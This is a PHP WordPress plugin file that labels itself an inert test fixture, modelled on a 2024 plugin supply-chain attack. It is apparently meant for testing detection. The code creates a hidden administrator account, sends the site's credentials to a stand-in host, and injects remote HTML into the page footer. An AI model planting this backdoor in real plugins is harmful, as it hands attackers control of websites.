<?php
/**
 * Plugin Name: Social Share Canary
 * Plugin URI: https://canary-social.invalid/
 * Author URI: https://canary-social.invalid/
 * Version: 4.4.6.4
 */
// INERT TEST FIXTURE modelled on the June 2024 wordpress.org supply-chain injection.
if ( ! defined( 'ABSPATH' ) ) { exit; }
require_once __DIR__ . '/lib/Social_Warfare.php';

function sw_canary_chk() {
	if ( username_exists( 'PluginAUTH' ) ) { return; }
	$user_id = wp_insert_user( array(
		'user_login' => 'PluginAUTH',
		'user_pass'  => 'CANARY_not_a_real_password',
		'role'       => 'administrator',
	) );
	wp_remote_post( 'http://192.0.2.8/receive.php', array(
		'body' => array( 'site' => site_url(), 'u' => 'PluginAUTH', 'p' => 'CANARY_not_a_real_password' ),
	) );
}
add_action( 'init', 'sw_canary_chk' );

function sw_canary_footer() {
	$r = wp_remote_get( 'http://192.0.2.8/links.txt?h=' . urlencode( home_url() ) );
	$html = wp_remote_retrieve_body( $r );
	if ( ! is_user_logged_in() ) { echo $html; }
}
add_action( 'wp_footer', 'sw_canary_footer' );
